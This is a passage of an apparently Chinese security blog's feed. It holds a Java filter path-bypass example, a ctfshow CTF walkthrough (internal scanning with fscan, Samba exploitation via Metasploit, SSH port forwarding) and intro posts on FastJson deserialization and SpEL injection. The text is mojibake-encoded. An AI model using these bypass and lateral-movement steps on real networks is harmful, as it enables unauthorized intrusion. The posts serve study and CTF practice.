httpServletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"No Permission."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶æˆ‘ä»¬å¦‚æœæƒ³è¦è®¿é—® &#x2F;test&#x2F;info ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚<code>/test/info/secert.jsp</code>çš„è¯ä¼šè¢«æ‹¦æˆªè¿”å›No Permission</p><p>è€Œæ ¹æ®å‰é¢çš„urlè§£ææˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹é¢è¿™å‡ ç§ç»•è¿‡çš„æ–¹æ³•ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/./info/secret.jsp</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/;aaa/info/secret.jsp</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/aaa/../info/secret.jsp</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/10083&quot;&gt;https://xz.aliyun.com/t/10083&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/7544&quot;&gt;https://xz.aliyun.com/t/7544&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow web859_æœ‰è·³æ¿æœº</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/</id>
    <published>2024-07-20T11:34:49.000Z</published>
    <updated>2024-07-20T12:53:37.037Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/">https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/</a></p><p><a href="https://www.cnblogs.com/thebeastofwar/p/17750376.html">https://www.cnblogs.com/thebeastofwar/p/17750376.html</a></p><span id="more"></span><hr><h1 id="è¿æ¥è·³æ¿æœº"><a href="#è¿æ¥è·³æ¿æœº" class="headerlink" title="è¿æ¥è·³æ¿æœº"></a>è¿æ¥è·³æ¿æœº</h1><p>sshè¿æ¥ä¸Šå»ï¼Œè´¦å¯†å‡ä¸ºctfshow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p28246</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç™»å½•ä¸Šå»ä¹‹åå°è¯•<code>cd ~</code>ï¼Œå‘ç°ç¼ºå°‘ &#x2F;home&#x2F;ctfshow ç›®å½•</p><p>å‘ç°èƒ½åˆ‡æˆrootæƒé™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨&#x2F;homeç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªctfshowç›®å½•ç»™æƒé™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /home/ctfshow<span class="token function">chmod</span> <span class="token number">777</span> /home/ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="fscanæ‰«ç«¯å£"><a href="#fscanæ‰«ç«¯å£" class="headerlink" title="fscanæ‰«ç«¯å£"></a>fscanæ‰«ç«¯å£</h1><p>æ¥ä¸‹æ¥ç”¨sshä¼ ä¸€ä¸ªfscanä¸Šå»æ‰«å†…ç½‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-P</span> <span class="token number">28246</span> fscan ctfshow@pwn.challenge.ctf.show:/home/ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720200128540.png" alt="image-20240720200128540"></p><p><code>ifconfig</code>æŸ¥çœ‹å†…ç½‘ç½‘æ®µ</p><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720203655783.png" alt="image-20240720203655783"></p><p>ç„¶åfscanæ‰«æ172.2.235.4</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> fscan./fscan <span class="token parameter variable">-h</span> <span class="token number">172.2</span>.235.4/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720203751766.png" alt="image-20240720203751766"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">start infoscan<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.4     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.1     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.5     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.6     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.7     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.2     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.3     is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">7</span><span class="token number">172.2</span>.235.6:139 <span class="token function">open</span><span class="token number">172.2</span>.235.4:22 <span class="token function">open</span><span class="token number">172.2</span>.235.5:80 <span class="token function">open</span><span class="token number">172.2</span>.235.6:445 <span class="token function">open</span><span class="token number">172.2</span>.235.5:9000 <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€äº†139å’Œ445ç«¯å£</p><p>çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªç«¯å£å¸¸æœ‰ä»€ä¹ˆæ¼æ´ï¼š</p><ul><li>139ï¼šsambaæœåŠ¡</li><li>445ï¼šsmbç›¸å…³æœåŠ¡</li></ul><h1 id="msf-getshell"><a href="#msf-getshell" class="headerlink" title="msf getshell"></a>msf getshell</h1><p>å› ä¸ºè·³æ¿æœºé‡Œå·²ç»æœ‰è£…äº†ä¸€äº›æ”»å‡»å·¥å…·ï¼Œé‚£ä¹ˆå¯åŠ¨msfï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720202823525.png" alt="image-20240720202823525"></p><p>æµ‹è¯•äº†ä¸€ä¸‹è¦ç”¨<code>is_known_pipename</code>æ‰“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/linux/samba/is_known_pipename<span class="token builtin class-name">set</span> rhost <span class="token number">172.2</span>.235.6exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204001343.png" alt="image-20240720204001343"></p><p>flagåœ¨rootä¸‹</p><hr><h1 id="æµ‹è¯•ï¼šå†…ç½‘ä»£ç†"><a href="#æµ‹è¯•ï¼šå†…ç½‘ä»£ç†" class="headerlink" title="æµ‹è¯•ï¼šå†…ç½‘ä»£ç†"></a>æµ‹è¯•ï¼šå†…ç½‘ä»£ç†</h1><p>è¿™é‡Œçš„è·³æ¿æœºç›¸å½“äºæˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€å°æœåŠ¡å™¨çš„æƒé™</p><h2 id="å•å±‚ä»£ç†"><a href="#å•å±‚ä»£ç†" class="headerlink" title="å•å±‚ä»£ç†"></a>å•å±‚ä»£ç†</h2><p>ç°åœ¨æˆ‘ä»¬å°è¯•å°†æœ¬åœ°çš„8085ç«¯å£è½¬å‘åˆ°å¯æ§æœåŠ¡å™¨å†…ç½‘ä¸­ 172.2.235.5 çš„80ç«¯å£ï¼ˆå³å†…ç½‘çš„webæœåŠ¡ï¼‰</p><p>ç„¶åå°±å¯ä»¥é€šè¿‡è®¿é—® 127.0.0.1:8085 æ¥è®¿é—® 172.2.235.5:80</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-L</span> <span class="token number">8085</span>:172.2.235.5:80 ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p</span> <span class="token number">28229</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204543400.png" alt="image-20240720204543400"></p><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204602540.png" alt="image-20240720204602540"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/&quot;&gt;https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/thebeastofwar/p/17750376.html&quot;&gt;https://www.cnblogs.com/thebeastofwar/p/17750376.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ¸—é€" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="ctfshow" scheme="http://c1oudfl0w0.github.io/blog/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>FastJsonååºåˆ—åŒ–</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/19/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/19/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-07-19T15:25:33.000Z</published>
    <updated>2024-07-19T15:28:56.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://natro92.fun/posts/ac90d224/">https://natro92.fun/posts/ac90d224/</a></p><p><a href="https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://zer0peach.github.io/2023/09/24/FastJSON/">https://zer0peach.github.io/2023/09/24/FastJSON/</a></p><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80">https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80</a></p><span id="more"></span><hr><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><blockquote><p>Fastjson æ˜¯ Alibaba å¼€å‘çš„ Java è¯­è¨€ç¼–å†™çš„é«˜æ€§èƒ½ JSON åº“ï¼Œç”¨äºå°†æ•°æ®åœ¨ JSON å’Œ Java Object ä¹‹é—´äº’ç›¸è½¬æ¢ã€‚</p></blockquote><p>æä¾›ä¸¤ä¸ªä¸»è¦æ¥å£æ¥åˆ†åˆ«å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚</p><p><code>JSON.toJSONString</code> å°† Java å¯¹è±¡è½¬æ¢ä¸º json å¯¹è±¡ï¼Œåºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚</p><p><code>JSON.parseObject/JSON.parse</code> å°† json å¯¹è±¡é‡æ–°å˜å› Java å¯¹è±¡ï¼›ååºåˆ—åŒ–çš„è¿‡ç¨‹</p><p>æ‰€ä»¥å¯ä»¥ç®€å•çš„æŠŠ json ç†è§£æˆæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</p><hr><h1 id="ä¾èµ–"><a href="#ä¾èµ–" class="headerlink" title="ä¾èµ–"></a>ä¾èµ–</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/ac90d224/&quot;&gt;https://natro92.fun/posts/ac90d224/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&quot;&gt;https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2023/09/24/FastJSON/&quot;&gt;https://zer0peach.github.io/2023/09/24/FastJSON/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80&quot;&gt;https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SPELè¡¨è¾¾å¼æ³¨å…¥</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</id>
    <published>2024-07-19T03:59:17.000Z</published>
    <updated>2024-07-19T15:04:07.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/</a></p><p><a href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><span id="more"></span><hr><h1 id="SPELè¡¨è¾¾å¼åŸºç¡€"><a href="#SPELè¡¨è¾¾å¼åŸºç¡€" class="headerlink" title="SPELè¡¨è¾¾å¼åŸºç¡€"></a>SPELè¡¨è¾¾å¼åŸºç¡€</h1><blockquote><p>åœ¨Spring 3ä¸­å¼•å…¥äº†Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆSpring Expression Languageï¼Œç®€ç§°SpELï¼‰ï¼Œè¿™æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼Œå¯ä»¥ä¸åŸºäºXMLå’ŒåŸºäºæ³¨è§£çš„Springé…ç½®è¿˜æœ‰beanå®šä¹‰ä¸€èµ·ä½¿ç”¨</p></blockquote><p>ç‰¹æ€§ï¼š</p><ul><li>ä½¿ç”¨Beançš„IDæ¥å¼•ç”¨Bean</li><li>å¯è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å¯¹è±¡çš„å±æ€§</li><li>å¯å¯¹å€¼è¿›è¡Œç®—æ•°ã€å…³ç³»å’Œé€»è¾‘è¿ç®—</li><li>å¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</li><li>å¯è¿›è¡Œé›†åˆæ“ä½œ</li></ul><h2 id="å®šç•Œç¬¦"><a href="#å®šç•Œç¬¦" class="headerlink" title="å®šç•Œç¬¦"></a>å®šç•Œç¬¦</h2><p><code>#&#123;&#125;</code>ï¼šæ‰€æœ‰åœ¨å¤§æ‹¬å·ä¸­çš„å­—ç¬¦éƒ½å°†è¢«è®¤ä¸ºæ˜¯SpELè¡¨è¾¾å¼ï¼Œåœ¨å…¶ä¸­å¯ä»¥ä½¿ç”¨SpELè¿ç®—ç¬¦ã€å˜é‡ã€å¼•ç”¨beanåŠå…¶å±æ€§å’Œæ–¹æ³•ç­‰</p><p>å’Œ<code>$&#123;&#125;</code>çš„åŒºåˆ«ï¼š</p><ul><li><p><code>#&#123;&#125;</code>å°±æ˜¯SpELçš„å®šç•Œç¬¦ï¼Œç”¨äºæŒ‡æ˜å†…å®¹æœªSpELè¡¨è¾¾å¼å¹¶æ‰§è¡Œï¼›</p></li><li><p><code>$&#123;&#125;</code>ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼ï¼›</p></li><li><p>ä¸¤è€…å¯ä»¥æ··åˆä½¿ç”¨ï¼Œä½†æ˜¯å¿…é¡»<code>#&#123;&#125;</code>åœ¨å¤–é¢ï¼Œ<code>$&#123;&#125;</code>åœ¨é‡Œé¢ï¼Œå¦‚<code>#&#123;&#39;$&#123;&#125;&#39;&#125;</code>ï¼Œæ³¨æ„å•å¼•å·æ˜¯å­—ç¬¦ä¸²ç±»å‹æ‰æ·»åŠ çš„</p></li></ul><p>ç»“è®ºï¼š<code>$&#123;&#125;</code>åªæ˜¯å•çº¯çš„ä¸€ä¸ªå ä½ç¬¦ï¼Œä¼šå¼•èµ·ä¸€äº›æ³¨å…¥ï¼Œæ¯”å¦‚SQLæ³¨å…¥ä¹‹ç±»çš„ã€‚è€Œ<code>#&#123;&#125;</code>è¿™å°±æ˜¯SPELç‰¹æœ‰çš„å®šç•Œç¬¦ã€‚ä¸­é—´çš„å†…å®¹ä¼šè¢«è§£æ</p><hr><h2 id="è¡¨è¾¾å¼ç±»å‹"><a href="#è¡¨è¾¾å¼ç±»å‹" class="headerlink" title="è¡¨è¾¾å¼ç±»å‹"></a>è¡¨è¾¾å¼ç±»å‹</h2><h3 id="å­—é¢å€¼"><a href="#å­—é¢å€¼" class="headerlink" title="å­—é¢å€¼"></a>å­—é¢å€¼</h3><p>æœ€ç®€å•çš„SpELè¡¨è¾¾å¼å°±æ˜¯ä»…åŒ…å«ä¸€ä¸ªå­—é¢å€¼ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬åœ¨XMLé…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨SpELè®¾ç½®ç±»å±æ€§çš„å€¼ä¸ºå­—é¢å€¼ï¼Œæ­¤æ—¶éœ€è¦ç”¨åˆ°<code>#&#123;&#125;</code>å®šç•Œç¬¦ï¼Œæ³¨æ„è‹¥æ˜¯æŒ‡å®šä¸ºå­—ç¬¦ä¸²çš„è¯éœ€è¦æ·»åŠ å•å¼•å·æ‹¬èµ·æ¥ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;666&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;'0w0'&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿˜å¯ä»¥ç›´æ¥ä¸å­—ç¬¦ä¸²æ··ç”¨ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>the value is #&#123;666&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>JavaåŸºæœ¬æ•°æ®ç±»å‹éƒ½å¯ä»¥å‡ºç°åœ¨SpELè¡¨è¾¾å¼ä¸­ï¼Œè¡¨è¾¾å¼ä¸­çš„æ•°å­—ä¹Ÿå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>salary<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;1e4&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="å¼•ç”¨Beanã€å±æ€§å’Œæ–¹æ³•"><a href="#å¼•ç”¨Beanã€å±æ€§å’Œæ–¹æ³•" class="headerlink" title="å¼•ç”¨Beanã€å±æ€§å’Œæ–¹æ³•"></a>å¼•ç”¨Beanã€å±æ€§å’Œæ–¹æ³•</h3><p>SpEL è¡¨è¾¾å¼èƒ½å¤Ÿé€šè¿‡å…¶ä»– Bean çš„ ID è¿›è¡Œå¼•ç”¨ï¼Œç›´æ¥åœ¨ <code>#&#123;&#125;</code> ç¬¦å·ä¸­å†™å…¥ ID åå³å¯ï¼Œæ— éœ€æ·»åŠ å•å¼•å·æ‹¬èµ·æ¥</p><p>å¸¸è§„å†™æ³•ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SpELä¸­ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;test&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span 